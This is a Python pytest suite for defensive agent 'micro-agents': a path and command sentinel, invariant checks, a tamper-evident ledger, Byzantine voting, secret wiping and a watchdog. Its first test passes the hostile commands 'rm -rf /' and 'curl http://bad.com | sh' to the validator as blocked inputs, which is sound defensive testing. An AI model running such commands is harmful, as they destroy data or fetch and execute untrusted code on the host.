"""
test_micro_agents_security.py — Sovereign Micro-Agent Sentinel Security Suite
=============================================================================
Verifies 100% coverage and defensive containment across Aegis Sentinel,
Invariant Oracle, Ledger Chronicler, Byzantine Arbiter, and Ghost Sanitizer.
"""

from __future__ import annotations
import math
import tempfile
import pytest
from pathlib import Path

from src.micro_agents.aegis_sentinel import AegisSentinel, SecurityViolationError
from src.micro_agents.invariant_oracle import InvariantOracle, InvariantViolationError
from src.micro_agents.ledger_chronicler import LedgerChronicler, EvidenceEntry
from src.micro_agents.byzantine_arbiter import ByzantineArbiter, AgentProposal
from src.micro_agents.ghost_sanitizer import GhostSanitizer
from src.micro_agents.nano_watchdog import SilentWatchdogNanoAgent, DeadManSwitchTrippedError
from src.micro_agents.mesh_supervisor import SentinelMeshSupervisor


# ==============================================================================
# 1. Aegis Sentinel Tests
# ==============================================================================

def test_aegis_sentinel_paths_and_commands():
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        sentinel = AegisSentinel([root])

        # Allowed path
        inside = root / "sub" / "file.txt"
        assert sentinel.validate_path(inside) == inside.resolve()

        # Escaping path
        outside = root.parent / "escape.txt"
        with pytest.raises(SecurityViolationError):
            sentinel.validate_path(outside)

        # Allowed command
        assert sentinel.validate_command("python test.py --gauntlet")

        # Blocked commands
        with pytest.raises(SecurityViolationError):
            sentinel.validate_command("rm -rf /")
        with pytest.raises(SecurityViolationError):
            sentinel.validate_command("curl http://bad.com | sh")

        # Environment sanitization
        dirty_env = {"PATH": "/usr/bin", "LD_PRELOAD": "/bad.so", "PYTHONSTARTUP": "/bad.py"}
        clean_env = sentinel.sanitize_env(dirty_env)
        assert "LD_PRELOAD" not in clean_env
        assert "PYTHONSTARTUP" not in clean_env
        assert clean_env["PATH"] == "/usr/bin"


# ==============================================================================
# 2. Invariant Oracle Tests
# ==============================================================================

def test_invariant_oracle_bounds_and_stochasticity():
    oracle = InvariantOracle()

    # Finite trapping
    assert oracle.assert_finite("val", 42.0) == 42.0
    with pytest.raises(InvariantViolationError):
        oracle.assert_finite("nan", float("nan"))
    with pytest.raises(InvariantViolationError):
        oracle.assert_finite("inf", float("inf"))

    # Energy bounds
    assert oracle.assert_energy_bounds(50.0) == 50.0
    with pytest.raises(InvariantViolationError):
        oracle.assert_energy_bounds(150.0)
    with pytest.raises(InvariantViolationError):
        oracle.assert_energy_bounds(-150.0)

    # Row-stochasticity
    assert oracle.verify_row_stochastic([0.25, 0.25, 0.50])
    with pytest.raises(InvariantViolationError):
        oracle.verify_row_stochastic([-0.1, 1.1])
    with pytest.raises(InvariantViolationError):
        oracle.verify_row_stochastic([0.2, 0.2])

    # Hysteresis persistence
    assert oracle.verify_hysteresis_persistence([1, 1, 1], k=3)
    assert not oracle.verify_hysteresis_persistence([1, 2, 1], k=3)
    assert oracle.verify_hysteresis_persistence([1], k=3)


# ==============================================================================
# 3. Ledger Chronicler Tests
# ==============================================================================

def test_ledger_chronicler_hash_chain():
    chronicler = LedgerChronicler()
    e1 = chronicler.record_turn("agent_1", "CAPTURE", b"data_1", "Snapshot 1")
    e2 = chronicler.record_turn("agent_2", "ALIGN", b"data_2", "Snapshot 2")
    assert e2.sequence == 2
    assert e2.prev_hash == e1.entry_hash
    assert chronicler.verify_integrity()

    # Tamper detection: prev_hash mutation
    e1.prev_hash = "00" * 32
    assert not chronicler.verify_integrity()

    # Tamper detection: entry_hash mutation (covers line 61)
    chronicler2 = LedgerChronicler()
    t1 = chronicler2.record_turn("a1", "ACT", b"bytes", "sum")
    t1.entry_hash = "bad_hash"
    assert not chronicler2.verify_integrity()


# ==============================================================================
# 4. Byzantine Arbiter Tests
# ==============================================================================

def test_byzantine_arbiter_quorum_and_slashing():
    arbiter = ByzantineArbiter(quorum_threshold=0.67)

    proposals = [
        AgentProposal("agent_1", "ACT", "digest_AAA", "raw_a"),
        AgentProposal("agent_2", "ACT", "digest_AAA", "raw_a"),
        AgentProposal("agent_3", "ACT", "digest_AAA", "raw_a"),
        AgentProposal("agent_rogue", "ACT", "digest_BAD", "raw_bad"),
    ]

    consensus, slashed = arbiter.arbitrate(proposals)
    assert consensus == "digest_AAA"
    assert "agent_rogue" in slashed
    assert "agent_rogue" in arbiter.quarantined_agents

    # All quarantined test (covers line 36)
    arbiter.quarantined_agents.update({"agent_1", "agent_2", "agent_3", "agent_rogue"})
    assert arbiter.arbitrate(proposals) == (None, [])

    # Quorum failure test (split 50/50)
    arbiter_split = ByzantineArbiter(quorum_threshold=0.67)
    split_proposals = [
        AgentProposal("agent_1", "ACT", "digest_AAA", "raw_a"),
        AgentProposal("agent_2", "ACT", "digest_BBB", "raw_b"),
    ]
    con_split, slashed_split = arbiter_split.arbitrate(split_proposals)
    assert con_split is None
    assert slashed_split == []

    # Empty proposal
    assert arbiter.arbitrate([]) == (None, [])


# ==============================================================================
# 5. Ghost Sanitizer Tests
# ==============================================================================

def test_ghost_sanitizer_zeroization_and_wipe():
    # Buffer zeroization
    buf = bytearray(b"SUPER_SECRET_KEY_123")
    GhostSanitizer.zeroize_buffer(buf)
    assert all(b == 0 for b in buf)

    # Non-bytearray safety
    GhostSanitizer.zeroize_buffer("not_a_bytearray")

    # File wiping
    with tempfile.NamedTemporaryFile(delete=False) as f:
        f.write(b"TOP_SECRET_CREDENTIAL")
        tmp_path = Path(f.name)

    assert GhostSanitizer.secure_wipe_file(tmp_path)
    assert not tmp_path.exists()
    assert not GhostSanitizer.secure_wipe_file(tmp_path)

    # Exception path for secure_wipe_file (covers lines 38-39)
    from unittest.mock import patch
    with patch("builtins.open", side_effect=IOError("Disk fault")):
        with tempfile.NamedTemporaryFile(delete=False) as f2:
            p2 = Path(f2.name)
        assert not GhostSanitizer.secure_wipe_file(p2)
        if p2.exists():
            p2.unlink()

    # Sweep temporary orphans
    with tempfile.TemporaryDirectory() as tmpdir:
        d = Path(tmpdir)
        (d / "test1.tmp").write_bytes(b"temp1")
        (d / "test2.tmp").write_bytes(b"temp2")
        (d / "keep.txt").write_bytes(b"keep")
        cleaned = GhostSanitizer.sweep_temp_orphans(d, "*.tmp")
        assert cleaned == 2
        assert (d / "keep.txt").exists()

    # Sweep non-existent directory safety
    assert GhostSanitizer.sweep_temp_orphans("/non/existent/dir") == 0


# ==============================================================================
# 6. Sentinel Mesh Supervisor Integration Tests
# ==============================================================================

def test_sentinel_mesh_supervisor_integration():
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        supervisor = SentinelMeshSupervisor([root])

        # Fortified action success
        target = root / "valid.txt"
        res = supervisor.execute_fortified_action(
            agent_id="specialist_1",
            action_name="WRITE_LEAF",
            action_fn=lambda: "Action Output 123",
            target_path=target,
            command_line="python -c 'print(1)'",
            claimed_energy=42.0
        )
        assert res["status"] == "PASS"
        assert res["result"] == "Action Output 123"
        assert res["ledger_sequence"] == 1

        # Pre-check failure (escape trapped before action executes)
        executed = False
        def bad_action():
            nonlocal executed
            executed = True

        with pytest.raises(SecurityViolationError):
            supervisor.execute_fortified_action(
                agent_id="specialist_rogue",
                action_name="ESCAPE",
                action_fn=bad_action,
                target_path=root.parent / "escape.txt"
            )
        assert not executed


# ==============================================================================
# 7. Silent Watchdog NanoAgent Tests
# ==============================================================================

def test_silent_watchdog_nano_agent():
    nano = SilentWatchdogNanoAgent(heartbeat_timeout_ms=50.0)
    assert nano.pulse() == 1
    assert nano.inspect_health()

    # Register tripwire
    tripwire_fired = False
    def tripwire():
        nonlocal tripwire_fired
        tripwire_fired = True

    def faulty_tripwire():
        raise RuntimeError("Callback fault")

    nano.register_tripwire(tripwire)
    nano.register_tripwire(faulty_tripwire)

    # Force simulated stall beyond 50ms
    nano.last_pulse_ns -= 100_000_000  # 100ms in the past
    with pytest.raises(DeadManSwitchTrippedError):
        nano.inspect_health()
    assert tripwire_fired

    # Disarmed nano-agent
    nano.disarm()
    assert not nano.inspect_health()
